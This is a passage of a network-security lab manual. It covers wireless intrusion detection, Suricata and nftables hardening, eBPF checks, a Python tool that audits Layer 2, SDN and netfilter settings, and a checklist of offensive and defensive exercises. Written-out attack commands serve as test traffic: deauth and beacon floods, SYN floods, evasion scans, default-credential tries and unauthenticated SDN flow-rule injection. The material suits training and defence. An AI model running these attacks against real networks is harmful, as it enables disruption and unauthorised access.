# Expected: APSPOOF alert — same SSID, unknown BSSID

# Test B: Deauth flood
aireplay-ng -0 0 -a AA:BB:CC:01:01:01 wlan0mon
# Expected: DEAUTHFLOOD alert

# Test C: Beacon flood (fake SSIDs)
mdk4 wlan0mon b -f /tmp/fake_ssids.txt -c 6
# Expected: Multiple new unknown SSIDs appear in Kismet
```

**Step 4 — Incident response workflow:**

```bash
# 1. Identify rogue AP
#    Kismet web UI (http://localhost:2501) → Alerts → APSPOOF
#    Note: BSSID, channel, signal strength, first seen, last seen

# 2. Physical location via signal strength triangulation
#    Multiple Kismet sensors → compare RSSI values
#    Strongest signal = closest sensor = approximate location

# 3. Deauth rogue AP's clients (containment)
aireplay-ng -0 0 -a <ROGUE_BSSID> wlan1mon

# 4. Switch-level: if rogue AP is on wired network
#    Identify port via MAC: show mac address-table address <ROGUE_MAC>
#    Disable port: interface GigX/X ; shutdown

# 5. Document
#    Export Kismet database: kismetdb_to_pcap <db_file>
#    Preserve evidence with timestamps
```

---

### Exercise 14: Detection Rule Validation and Netfilter Hardening

**Objective:** Validate all L2/wireless/SDN Suricata rules against test traffic, harden netfilter against known bypass techniques, and deploy eBPF-based security controls.

**Step 1 — Suricata rule validation (VM3):**

```bash
# Syntax check
suricata -T -c /etc/suricata/suricata.yaml
# Expected: Configuration provided was successfully loaded. Exiting.

# Start in IDS mode
suricata -c /etc/suricata/suricata.yaml -i eth0 &

# Generate test traffic from VM2 and check alerts:

# Test: ARP flood
python3 /opt/attacks/l2/arp_spoof.py attack -i eth0 -v 10.9.2.10 -g 10.9.2.1
# Check: grep "ARP Spoofing" /var/log/suricata/fast.log

# Test: DHCP starvation
python3 /opt/attacks/l2/dhcp_attack.py starve -i eth0 -c 50
# Check: grep "DHCP Starvation" /var/log/suricata/fast.log

# Test: SDN API access
curl http://10.9.2.50:8080/stats/switches
# Check: grep "SDN Controller API" /var/log/suricata/fast.log

# Test: Flow injection
curl -X POST http://10.9.2.50:8080/stats/flowentry/add \
    -H "Content-Type: application/json" \
    -d '{"dpid":1,"priority":100,"match":{},"actions":[]}'
# Check: grep "SDN Flow Injection" /var/log/suricata/fast.log

# Alert summary
grep "\\[\\*\\*\\]" /var/log/suricata/fast.log | sort | uniq -c | sort -rn
```

**Step 2 — Netfilter hardening against bypass (VM3):**

```bash
#!/bin/bash
# netfilter_hardening.sh

# ── Load defragmentation modules ──
# Reassemble fragments before filtering (prevents fragment evasion)
modprobe nf_defrag_ipv4
modprobe nf_defrag_ipv6

# ── Increase conntrack table (prevent exhaustion DoS) ──
sysctl -w net.netfilter.nf_conntrack_max=524288
sysctl -w net.netfilter.nf_conntrack_buckets=131072

# Aggressive timeouts to limit table consumption
sysctl -w net.netfilter.nf_conntrack_tcp_timeout_established=3600
sysctl -w net.netfilter.nf_conntrack_tcp_timeout_time_wait=30
sysctl -w net.netfilter.nf_conntrack_udp_timeout=30
sysctl -w net.netfilter.nf_conntrack_udp_timeout_stream=120
sysctl -w net.netfilter.nf_conntrack_icmp_timeout=10

# ── nftables firewall with anti-bypass rules ──
nft flush ruleset

nft add table inet filter
nft add chain inet filter input '{ type filter hook input priority 0; policy drop; }'
nft add chain inet filter forward '{ type filter hook forward priority 0; policy drop; }'
nft add chain inet filter output '{ type filter hook output priority 0; policy accept; }'

# Allow established/related
nft add rule inet filter input ct state established,related accept
nft add rule inet filter input iif lo accept

# Rate-limit new connections (anti-SYN flood)
nft add rule inet filter input tcp flags syn limit rate 25/second burst 50 accept
nft add rule inet filter input tcp flags syn drop

# Drop invalid state packets
nft add rule inet filter input ct state invalid drop

# Drop XMAS and NULL scans
nft add rule inet filter input tcp flags '& (fin|psh|urg) == fin|psh|urg' drop
nft add rule inet filter input tcp flags '& (syn|rst|ack|fin|urg|psh) == 0' drop

# Allow specific services
nft add rule inet filter input tcp dport 22 accept     # SSH
nft add rule inet filter input tcp dport 80 accept      # HTTP
nft add rule inet filter input udp dport 53 accept      # DNS

# Drop small fragments (evasion indicator)
nft add rule inet filter input ip frag-off '& 0x1fff != 0' ip length '<' 100 drop

# Log and drop everything else
nft add rule inet filter input limit rate 5/minute log prefix '"NFT-DROP: "' drop

# ── Persist ──
nft list ruleset > /etc/nftables_hardened.conf
echo "[+] Netfilter hardened — rules saved to /etc/nftables_hardened.conf"
```

**Step 3 — Test bypass attempts (VM2):**

```bash
# Test 1: Fragmented scan
nmap -f -sS 10.9.2.30
# Expected: fragments reassembled, scan blocked or detected

# Test 2: Double fragmentation
nmap -f -f -sS 10.9.2.30
# Expected: still blocked

# Test 3: Source port bypass
nmap --source-port 53 -sS 10.9.2.30
# Expected: only port 53 rules allow UDP, TCP scan blocked

# Test 4: Conntrack exhaustion
hping3 --rand-source -p ++1 -S --flood 10.9.2.30
# Expected: conntrack handles via increased max, old entries expire quickly

# Test 5: TTL evasion
nmap --ttl 5 -sS 10.9.2.30
# Expected: If IDS/FW on same segment, TTL irrelevant
```

**Step 4 — eBPF/XDP security controls (VM3):**

```bash
# Restrict unprivileged BPF
sysctl -w kernel.unprivileged_bpf_disabled=1

# Verify loaded BPF programs
bpftool prog list
bpftool map list

# Check for suspicious BPF programs
bpftool prog list | grep -i "type xdp\|type sched_cls\|type cgroup"

# Monitor BPF verifier events
bpftool prog tracelog

# Verify no unauthorized XDP programs on interfaces
for iface in $(ls /sys/class/net/); do
    xdp=$(ip link show "$iface" | grep -c "xdp")
    if [ "$xdp" -gt 0 ]; then
        echo "[ALERT] XDP program attached to $iface"
        ip link show "$iface"
    fi
done
```

---

## PART C: FRAMEWORK DEVELOPMENT

### L2WSAT — Layer 2, Wireless, and SDN Assessment Toolkit

**Purpose:** Automated security assessment framework for Layer 2 infrastructure, wireless networks, and SDN environments. Generates findings with severity ratings and produces detection rules for discovered vulnerabilities.

```python
#!/usr/bin/env python3
"""
L2WSAT — Layer 2, Wireless, and SDN Assessment Toolkit
Comprehensive security assessment for:
  - L2: ARP, CAM, VLAN, STP, DHCP, CDP/LLDP
  - WiFi: AP security, encryption, WPS, PMF
  - SDN: Controller API, flow integrity, overlay security
  - Netfilter: Bypass resistance, conntrack health

Usage:
    python3 l2wsat.py --target 10.9.2.0/24 --modules l2,sdn --output report
    python3 l2wsat.py --target 10.9.2.0/24 --modules all --format markdown
"""

import json
import time
import socket
import struct
import argparse
import datetime
import subprocess
from typing import Optional
from dataclasses import dataclass, field, asdict


# ═══════════════════════════════════════════════════════════════
#  DATA STRUCTURES
# ═══════════════════════════════════════════════════════════════

@dataclass
class Finding:
    title: str
    severity: str   # CRITICAL, HIGH, MEDIUM, LOW, INFO
    category: str   # L2, WIFI, SDN, NETFILTER
    description: str
    evidence: str
    remediation: str
    cve: str = ""
    cvss: float = 0.0
    mitre_attack: str = ""

@dataclass
class AssessmentResult:
    target: str
    module: str
    timestamp: str
    findings: list = field(default_factory=list)
    summary: dict = field(default_factory=dict)


# ═══════════════════════════════════════════════════════════════
#  LAYER 2 ASSESSOR
# ═══════════════════════════════════════════════════════════════

class L2SecurityAssessor:
    def __init__(self, interface: str, target_subnet: str):
        self.iface = interface
        self.subnet = target_subnet
        self.findings: list[Finding] = []

    def _run_cmd(self, cmd: str, timeout: int = 30) -> str:
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=timeout
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "[TIMEOUT]"
        except Exception as e:
            return f"[ERROR] {e}"

    def check_arp_security(self) -> list[Finding]:
        """Check for ARP-related vulnerabilities."""
        findings = []

        # Check if gratuitous ARP is accepted
        output = self._run_cmd(
            "sysctl net.ipv4.conf.all.arp_accept"
        )
        if "= 1" in output:
            findings.append(Finding(
                title="Gratuitous ARP Accepted",
                severity="HIGH",
                category="L2",
                description=(
                    "System accepts gratuitous ARP replies, making it "
                    "vulnerable to ARP cache poisoning attacks."
                ),
                evidence=output.strip(),
                remediation=(
                    "Set net.ipv4.conf.all.arp_accept=0. "
                    "Deploy DAI on the switch. Use static ARP for gateway."
                ),
                mitre_attack="T1557.002"
            ))

        # Check for duplicate IPs in ARP table (potential spoofing)
        arp_output = self._run_cmd("ip neigh show")
        ip_mac = {}
        for line in arp_output.split('\n'):
            parts = line.split()
            if len(parts) >= 5 and parts[2] == 'lladdr':
                ip = parts[0]
                mac = parts[4]
                if ip in ip_mac and ip_mac[ip] != mac:
                    findings.append(Finding(
                        title="ARP Cache Inconsistency Detected",
                        severity="CRITICAL",
                        category="L2",
                        description=(
                            f"IP {ip} maps to multiple MACs: "
                            f"{ip_mac[ip]} and {mac}. "
                            "Possible active ARP spoofing."
                        ),
                        evidence=f"ip neigh: {ip} → {ip_mac[ip]}, {mac}",
                        remediation="Investigate immediately. Check arpwatch logs.",
                        mitre_attack="T1557.002"
                    ))
                ip_mac[ip] = mac

        return findings

    def check_dhcp_security(self) -> list[Finding]:
        """Check DHCP security posture."""
        findings = []

        # Check if DHCP client is running (potential target)
        output = self._run_cmd("pgrep -la dhclient || pgrep -la dhcpcd")
        if "dhclient" in output or "dhcpcd" in output:
            findings.append(Finding(
                title="DHCP Client Active",
                severity="MEDIUM",
                category="L2",
                description=(
                    "DHCP client is active. Without DHCP snooping on the "
                    "switch, this host is vulnerable to rogue DHCP attacks."
                ),
                evidence=output.strip(),
                remediation="Verify DHCP snooping is enabled on the switch.",
                mitre_attack="T1557.003"
            ))

        return findings

    def check_vlan_security(self) -> list[Finding]:
        """Check for VLAN-related vulnerabilities."""
        findings = []

        # Check if 802.1Q module is loaded (potential VLAN hop target)
        output = self._run_cmd("lsmod | grep 8021q")
        if "8021q" in output:
            findings.append(Finding(
                title="802.1Q VLAN Module Loaded",
                severity="INFO",
                category="L2",
                description="802.1Q module loaded — host can create VLAN sub-interfaces.",
                evidence=output.strip(),
                remediation=(
                    "Expected on trunk ports. Verify DTP is disabled on all access ports. "
                    "Set native VLAN to unused VLAN."
                )
            ))

        # Check for VLAN sub-interfaces
        vlan_output = self._run_cmd("ip -d link show | grep -A1 'vlan protocol'")
        if "vlan protocol" in vlan_output:
            findings.append(Finding(
                title="VLAN Sub-Interfaces Detected",
                severity="MEDIUM",
                category="L2",
                description="Active VLAN sub-interfaces exist — indicates trunk port.",
                evidence=vlan_output.strip(),
                remediation="Verify these are authorized. Check for DTP abuse."
            ))

        return findings

    def check_network_discovery_protocols(self) -> list[Finding]:
        """Check for CDP/LLDP information exposure."""
        findings = []

        # Sniff for CDP/LLDP frames (brief capture)
        output = self._run_cmd(
            f"timeout 10 tcpdump -i {self.iface} -c 5 -nn "
            "'ether[20:2] == 0x2000 or ether proto 0x88cc' 2>&1"
        )
        if "CDP" in output or "LLDP" in output:
            findings.append(Finding(
                title="Discovery Protocol Frames Detected",
                severity="MEDIUM",
                category="L2",
                description=(
                    "CDP or LLDP frames detected on this port. "
                    "These leak device names, IPs, platform info, and VLAN data."
                ),
                evidence=output.strip()[:500],
                remediation=(
                    "Disable CDP/LLDP on access ports facing untrusted devices. "
                    "Keep only on inter-switch trunks."
                ),
                mitre_attack="T1018"
            ))

        return findings

    def assess(self) -> AssessmentResult:
        result = AssessmentResult(
            target=self.subnet,
            module="L2",
            timestamp=datetime.datetime.now(datetime.timezone.utc).isoformat()
        )
        result.findings.extend(self.check_arp_security())
        result.findings.extend(self.check_dhcp_security())
        result.findings.extend(self.check_vlan_security())
        result.findings.extend(self.check_network_discovery_protocols())

        self.findings = result.findings
        result.summary = self._summarize()
        return result

    def _summarize(self) -> dict:
        counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for f in self.findings:
            counts[f.severity] = counts.get(f.severity, 0) + 1
        return counts


# ═══════════════════════════════════════════════════════════════
#  SDN ASSESSOR
# ═══════════════════════════════════════════════════════════════

class SDNSecurityAssessor:
    def __init__(self, controller_endpoints: list[str]):
        self.endpoints = controller_endpoints
        self.findings: list[Finding] = []

    def _http_get(self, url: str, timeout: int = 5) -> Optional[str]:
        try:
            import urllib.request
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=timeout)
            return resp.read().decode()
        except Exception:
            return None

    def _http_get_auth(self, url: str, user: str, password: str,
                        timeout: int = 5) -> Optional[str]:
        try:
            import urllib.request
            import base64
            auth = base64.b64encode(f"{user}:{password}".encode()).decode()
            req = urllib.request.Request(url)
            req.add_header('Authorization', f'Basic {auth}')
            resp = urllib.request.urlopen(req, timeout=timeout)
            return resp.read().decode()
        except Exception:
            return None

    def check_ryu_api(self, base_url: str) -> list[Finding]:
        findings = []
        resp = self._http_get(f"{base_url}/stats/switches")
        if resp:
            findings.append(Finding(
                title="Ryu Controller API — Unauthenticated Access",
                severity="CRITICAL",
                category="SDN",
                description=(
                    "Ryu SDN controller REST API accessible without authentication. "
                    "An attacker can enumerate the network, inject flow rules, "
                    "blackhole hosts, or redirect traffic."
                ),
                evidence=f"GET /stats/switches → {resp[:200]}",
                remediation=(
                    "Deploy API gateway with authentication (OAuth2, mTLS). "
                    "Restrict API to management VLAN. Enable TLS on OpenFlow channel."
                ),
                cvss=9.8,
                mitre_attack="T1190"
            ))

            # Check if flow injection is possible
            try:
                import urllib.request
                test_flow = json.dumps({
                    "dpid": 1, "table_id": 0, "priority": 1,
                    "match": {}, "actions": []
                }).encode()
                req = urllib.request.Request(
                    f"{base_url}/stats/flowentry/add",
                    data=test_flow,
                    headers={'Content-Type': 'application/json'},
                    method='POST'
                )
                resp = urllib.request.urlopen(req, timeout=5)
                if resp.status == 200:
                    findings.append(Finding(
                        title="SDN Flow Rule Injection — No Authorization",
                        severity="CRITICAL",
                        category="SDN",
                        description=(
                            "Flow rules can be injected via unauthenticated API. "
                            "Attacker can create blackholes, mirrors, or redirects."
                        ),
                        evidence="POST /stats/flowentry/add → 200 OK",
                        remediation="Implement RBAC on flow modification API.",
                        cvss=9.8,
                        mitre_attack="T1565"
                    ))
                    # Clean up test flow
                    del_req = urllib.request.Request(
                        f"{base_url}/stats/flowentry/delete",
                        data=test_flow,
                        headers={'Content-Type': 'application/json'},
                        method='POST'
                    )
                    urllib.request.urlopen(del_req, timeout=5)
            except Exception:
                pass

        return findings

    def check_odl_api(self, base_url: str) -> list[Finding]:
        findings = []
        # Test default credentials
        for user, pwd in [("admin", "admin"), ("karaf", "karaf")]:
            resp = self._http_get_auth(
                f"{base_url}/restconf/operational/"
                "opendaylight-inventory:nodes",
                user, pwd
            )
            if resp:
                findings.append(Finding(
                    title=f"OpenDaylight — Default Credentials ({user}/{pwd})",
                    severity="CRITICAL",
                    category="SDN",
                    description=(
                        f"OpenDaylight controller accessible with default "
                        f"credentials {user}/{pwd}."
                    ),
                    evidence=f"GET /restconf/operational/... → 200 with {user}/{pwd}",
                    remediation="Change default credentials immediately.",
                    cvss=9.8,
                    mitre_attack="T1078.001"
                ))
                break
        return findings

    def check_openflow_tls(self) -> list[Finding]:
        findings = []
        for endpoint in self.endpoints:
            host = endpoint.split('//')[1].split(':')[0] if '//' in endpoint else endpoint
            # Check if OpenFlow port is open (plaintext)
            for port in [6633, 6653]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    result = sock.connect_ex((host, port))
                    sock.close()
                    if result == 0:
                        findings.append(Finding(
                            title=f"OpenFlow Plaintext Channel on {host}:{port}",
                            severity="HIGH",
                            category="SDN",
                            description=(
                                "OpenFlow channel is accessible over plaintext TCP. "
                                "An attacker with network access can inject or "
                                "modify flow rules via MitM."
                            ),
                            evidence=f"TCP connect to {host}:{port} succeeded",
                            remediation=(
                                "Enable TLS on the OpenFlow channel. "
                                "Use mutual TLS between controller and switches."
                            ),
                            cvss=7.5,
                            mitre_attack="T1040"
                        ))
                except Exception:
                    pass
        return findings

    def assess(self) -> AssessmentResult:
        result = AssessmentResult(
            target=str(self.endpoints),
            module="SDN",
            timestamp=datetime.datetime.now(datetime.timezone.utc).isoformat()
        )
        for ep in self.endpoints:
            if ':8080' in ep:
                result.findings.extend(self.check_ryu_api(ep))
            if ':8181' in ep:
                result.findings.extend(self.check_odl_api(ep))
        result.findings.extend(self.check_openflow_tls())

        self.findings = result.findings
        result.summary = self._summarize()
        return result

    def _summarize(self) -> dict:
        counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for f in self.findings:
            counts[f.severity] = counts.get(f.severity, 0) + 1
        return counts


# ═══════════════════════════════════════════════════════════════
#  NETFILTER ASSESSOR
# ═══════════════════════════════════════════════════════════════

class NetfilterAssessor:
    def __init__(self, target_ip: str):
        self.target = target_ip
        self.findings: list[Finding] = []

    def _run_cmd(self, cmd: str, timeout: int = 30) -> str:
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=timeout
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "[TIMEOUT]"
        except Exception as e:
            return f"[ERROR] {e}"

    def check_conntrack_health(self) -> list[Finding]:
        findings = []
        ct_count = self._run_cmd(
            "cat /proc/sys/net/netfilter/nf_conntrack_count"
        ).strip()
        ct_max = self._run_cmd(
            "cat /proc/sys/net/netfilter/nf_conntrack_max"
        ).strip()
        try:
            count = int(ct_count)
            maximum = int(ct_max)
            usage_pct = (count / maximum) * 100 if maximum > 0 else 0

            if usage_pct > 80:
                findings.append(Finding(
                    title="Conntrack Table Near Exhaustion",
                    severity="HIGH",
                    category="NETFILTER",
                    description=(
                        f"Connection tracking table at {usage_pct:.1f}% "
                        f"({count}/{maximum}). Risk of packet drops."
                    ),
                    evidence=f"nf_conntrack_count={count}, nf_conntrack_max={maximum}",
                    remediation=(
                        "Increase nf_conntrack_max. Reduce timeouts. "
                        "NOTRACK high-volume stateless traffic."
                    )
                ))
            elif maximum < 131072:
                findings.append(Finding(
                    title="Conntrack Table Size Below Recommendation",
                    severity="MEDIUM",
                    category="NETFILTER",
                    description=(
                        f"Conntrack max is {maximum}. "
                        "May be vulnerable to exhaustion attacks."
                    ),
                    evidence=f"nf_conntrack_max={maximum}",
                    remediation="Set nf_conntrack_max >= 262144 for production."
                ))
        except ValueError:
            pass

        return findings

    def check_defrag_modules(self) -> list[Finding]:
        findings = []
        output = self._run_cmd("lsmod | grep nf_defrag")
        if "nf_defrag_ipv4" not in output:
            findings.append(Finding(
                title="IPv4 Defragmentation Module Not Loaded",
                severity="HIGH",
                category="NETFILTER",
                description=(
                    "nf_defrag_ipv4 not loaded. Fragmented packets bypass "
                    "L4 inspection rules."
                ),
                evidence="lsmod: nf_defrag_ipv4 not present",
                remediation="modprobe nf_defrag_ipv4"
            ))
        if "nf_defrag_ipv6" not in output:
            findings.append(Finding(
                title="IPv6 Defragmentation Module Not Loaded",
                severity="MEDIUM",
                category="NETFILTER",
                description="nf_defrag_ipv6 not loaded. IPv6 fragment evasion possible.",
                evidence="lsmod: nf_defrag_ipv6 not present",
                remediation="modprobe nf_defrag_ipv6"
            ))
        return findings

    def check_ebpf_security(self) -> list[Finding]:
        findings = []
        unprivileged = self._run_cmd(
            "sysctl kernel.unprivileged_bpf_disabled"
        ).strip()
        if "= 0" in unprivileged:
            findings.append(Finding(
                title="Unprivileged BPF Enabled",
                severity="HIGH",
                category="NETFILTER",
                description=(
                    "Unprivileged users can load BPF programs. "
                    "Historical verifier bypasses (CVE-2021-3490, "
                    "CVE-2021-31440) enable kernel code execution."
                ),
                evidence=unprivileged,
                remediation=(
                    "sysctl -w kernel.unprivileged_bpf_disabled=1"
                ),
                mitre_attack="T1068"
            ))

        # Check for unexpected BPF programs
        bpf_progs = self._run_cmd("bpftool prog list 2>/dev/null")
        if bpf_progs and "error" not in bpf_progs.lower():
            prog_count = len([
                l for l in bpf_progs.split('\n')
                if l.strip() and not l.startswith(' ')
            ])
            if prog_count > 0:
                findings.append(Finding(
                    title=f"{prog_count} BPF Program(s) Loaded",
                    severity="INFO",
                    category="NETFILTER",
                    description=f"Active BPF programs detected. Verify authorization.",
                    evidence=bpf_progs[:500],
                    remediation="Audit BPF programs with bpftool prog list."
                ))

        return findings

    def assess(self) -> AssessmentResult:
        result = AssessmentResult(
            target=self.target,
            module="NETFILTER",
            timestamp=datetime.datetime.now(datetime.timezone.utc).isoformat()
        )
        result.findings.extend(self.check_conntrack_health())
        result.findings.extend(self.check_defrag_modules())
        result.findings.extend(self.check_ebpf_security())

        self.findings = result.findings
        result.summary = self._summarize()
        return result

    def _summarize(self) -> dict:
        counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for f in self.findings:
            counts[f.severity] = counts.get(f.severity, 0) + 1
        return counts


# ═══════════════════════════════════════════════════════════════
#  DETECTION RULE GENERATOR
# ═══════════════════════════════════════════════════════════════

class DetectionRuleGenerator:
    def __init__(self, findings: list[Finding]):
        self.findings = findings

    def generate_suricata_rules(self) -> list[str]:
        rules = []
        sid_base = 3000000
        for i, f in enumerate(self.findings):
            if f.severity not in ("CRITICAL", "HIGH"):
                continue
            sid = sid_base + i
            cat = f.category.lower()
            title_slug = f.title.replace(' ', '_')[:50]
            rules.append(
                f'alert ip any any -> any any '
                f'(msg:"L2WSAT-{cat}-{title_slug}"; '
                f'sid:{sid}; rev:1;)'
            )
        return rules

    def generate_sigma_rules(self) -> list[dict]:
        sigma_rules = []
        for f in self.findings:
            if f.severity not in ("CRITICAL", "HIGH"):
                continue
            sigma_rules.append({
                "title": f"L2WSAT: {f.title}",
                "status": "experimental",
                "description": f.description,
                "logsource": {"category": "network", "product": "suricata"},
                "detection": {
                    "selection": {"alert.signature": f"*{f.title[:30]}*"},
                    "condition": "selection"
                },
                "level": f.severity.lower(),
                "tags": [f.mitre_attack] if f.mitre_attack else []
            })
        return sigma_rules


# ═══════════════════════════════════════════════════════════════
#  REPORT GENERATOR
# ═══════════════════════════════════════════════════════════════

class ReportGenerator:
    def __init__(self, results: list[AssessmentResult]):
        self.results = results

    def to_json(self, output_path: str):
        data = {
            "assessment": "L2WSAT — Layer 2, Wireless, and SDN Security Assessment",
            "generated": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "results": []
        }
        for r in self.results:
            data["results"].append({
                "target": r.target,
                "module": r.module,
                "timestamp": r.timestamp,
                "summary": r.summary,
                "findings": [asdict(f) for f in r.findings]
            })
        with open(f"{output_path}.json", 'w') as fp:
            json.dump(data, fp, indent=2)
        print(f"[+] JSON report: {output_path}.json")

    def to_markdown(self, output_path: str):
        lines = [
            "# L2WSAT Security Assessment Report\n",
            f"**Generated:** {datetime.datetime.now(datetime.timezone.utc).isoformat()}\n",
            "---\n"
        ]

        total_findings = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0,
                          "LOW": 0, "INFO": 0}
        for r in self.results:
            for sev, cnt in r.summary.items():
                total_findings[sev] = total_findings.get(sev, 0) + cnt

        lines.append("## Executive Summary\n")
        lines.append("| Severity | Count |")
        lines.append("|----------|-------|")
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            lines.append(f"| {sev} | {total_findings.get(sev, 0)} |")
        lines.append("")

        for r in self.results:
            lines.append(f"## Module: {r.module}\n")
            lines.append(f"**Target:** {r.target}  ")
            lines.append(f"**Timestamp:** {r.timestamp}\n")

            for i, f in enumerate(r.findings, 1):
                sev_icon = {
                    "CRITICAL": "[!]", "HIGH": "[!]", "MEDIUM": "[~]",
                    "LOW": "[-]", "INFO": "[i]"
                }.get(f.severity, "[?]")

                lines.append(f"### {sev_icon} {i}. {f.title}\n")
                lines.append(f"**Severity:** {f.severity}")
                if f.cvss:
                    lines.append(f"  |  **CVSS:** {f.cvss}")
                if f.cve:
                    lines.append(f"  |  **CVE:** {f.cve}")
                if f.mitre_attack:
                    lines.append(f"  |  **MITRE ATT&CK:** {f.mitre_attack}")
                lines.append(f"\n**Description:** {f.description}\n")
                lines.append(f"**Evidence:**\n```\n{f.evidence}\n```\n")
                lines.append(f"**Remediation:** {f.remediation}\n")
                lines.append("---\n")

        # Detection rules section
        all_findings = [f for r in self.results for f in r.findings]
        gen = DetectionRuleGenerator(all_findings)
        suricata_rules = gen.generate_suricata_rules()

        if suricata_rules:
            lines.append("## Generated Detection Rules\n")
            lines.append("### Suricata\n")
            lines.append("```")
            for rule in suricata_rules:
                lines.append(rule)
            lines.append("```\n")

        with open(f"{output_path}.md", 'w') as fp:
            fp.write('\n'.join(lines))
        print(f"[+] Markdown report: {output_path}.md")


# ═══════════════════════════════════════════════════════════════
#  CLI
# ═══════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description='L2WSAT — Layer 2, Wireless, and SDN Assessment Toolkit'
    )
    parser.add_argument('--target', required=True,
                        help='Target subnet or IP (e.g., 10.9.2.0/24)')
    parser.add_argument('--interface', '-i', default='eth0',
                        help='Network interface')
    parser.add_argument('--modules', default='all',
                        help='Comma-separated: l2,sdn,netfilter,all')
    parser.add_argument('--sdn-endpoints', nargs='*',
                        default=['http://10.9.2.50:8080'],
                        help='SDN controller URLs')
    parser.add_argument('--output', '-o', default='l2wsat_report',
                        help='Output filename (without extension)')
    parser.add_argument('--format', '-f', choices=['json', 'markdown', 'both'],
                        default='both', help='Report format')
    args = parser.parse_args()

    modules = args.modules.lower().split(',')
    if 'all' in modules:
        modules = ['l2', 'sdn', 'netfilter']

    results = []

    if 'l2' in modules:
        print("\n[*] Running L2 Security Assessment...")
        l2 = L2SecurityAssessor(args.interface, args.target)
        results.append(l2.assess())
        print(f"    Findings: {l2._summarize()}")

    if 'sdn' in modules:
        print("\n[*] Running SDN Security Assessment...")
        sdn = SDNSecurityAssessor(args.sdn_endpoints)
        results.append(sdn.assess())
        print(f"    Findings: {sdn._summarize()}")

    if 'netfilter' in modules:
        print("\n[*] Running Netfilter Security Assessment...")
        nf = NetfilterAssessor(args.target)
        results.append(nf.assess())
        print(f"    Findings: {nf._summarize()}")

    # Generate reports
    reporter = ReportGenerator(results)
    if args.format in ('json', 'both'):
        reporter.to_json(args.output)
    if args.format in ('markdown', 'both'):
        reporter.to_markdown(args.output)

    # Summary
    total = sum(len(r.findings) for r in results)
    critical = sum(r.summary.get("CRITICAL", 0) for r in results)
    high = sum(r.summary.get("HIGH", 0) for r in results)
    print(f"\n{'='*60}")
    print(f"  ASSESSMENT COMPLETE")
    print(f"  Total findings: {total}")
    print(f"  CRITICAL: {critical}  HIGH: {high}")
    print(f"{'='*60}")

    return 1 if critical > 0 else 0


if __name__ == '__main__':
    exit(main())
```

**Save and run:**

```bash
# Save to /opt/l2wsat/l2wsat.py on VM3

# Full assessment
python3 /opt/l2wsat/l2wsat.py \
    --target 10.9.2.0/24 \
    -i eth0 \
    --modules all \
    --sdn-endpoints http://10.9.2.50:8080 \
    --output /tmp/l2wsat_report \
    --format both

# L2-only assessment
python3 /opt/l2wsat/l2wsat.py \
    --target 10.9.2.0/24 \
    --modules l2 \
    --output /tmp/l2_report

# SDN-only with multiple controllers
python3 /opt/l2wsat/l2wsat.py \
    --target 10.9.2.0/24 \
    --modules sdn \
    --sdn-endpoints http://10.9.2.50:8080 http://10.9.2.51:8181 \
    --output /tmp/sdn_report
```

---

## Lab Validation Checklist

### Part A — Offensive

- [ ] **Ex1:** ARP spoof captures cleartext credentials (HTTP, FTP)
- [ ] **Ex2:** MAC flood causes hub-mode; foreign unicast visible
- [ ] **Ex3:** DTP trunk negotiation or double-tagged frame reaches target VLAN
- [ ] **Ex4:** STP root bridge hijack verified via BPDU monitor
- [ ] **Ex5:** DHCP starvation empties pool; rogue DHCP assigns attacker as gateway
- [ ] **Ex6:** WPA2 handshake captured and cracked; PMKID extracted clientlessly
- [ ] **Ex7:** Evil twin captive portal captures credentials; KARMA responds to all probes
- [ ] **Ex8:** WPA2-Enterprise MSCHAPv2 hash captured and cracked
- [ ] **Ex9:** BLE devices enumerated; GATT characteristics read/written
- [ ] **Ex10:** 125 kHz card cloned; MIFARE Classic keys recovered and card dumped
- [ ] **Ex11:** SDN controller enumerated via unauthenticated API; flow rules injected; topology spoofed

### Part B — Defensive

- [ ] **Ex12:** Port security blocks MAC flood; DAI drops spoofed ARP; BPDU guard disables port; DHCP snooping blocks rogue server; DTP disabled
- [ ] **Ex13:** Kismet WIDS generates alerts for evil twin, deauth flood; incident response workflow documented
- [ ] **Ex14:** All Suricata rules fire correctly; netfilter hardened against fragment/conntrack/TTL evasion; eBPF unprivileged access restricted

### Part C — Framework

- [ ] **L2WSAT:** L2 module detects ARP, DHCP, VLAN, discovery protocol issues
- [ ] **L2WSAT:** SDN module detects unauthenticated APIs and plaintext OpenFlow
- [ ] **L2WSAT:** Netfilter module checks conntrack health, defrag modules, eBPF
- [ ] **L2WSAT:** Reports generated in JSON and Markdown with severity rankings
- [ ] **L2WSAT:** Detection rules auto-generated from CRITICAL/HIGH findings
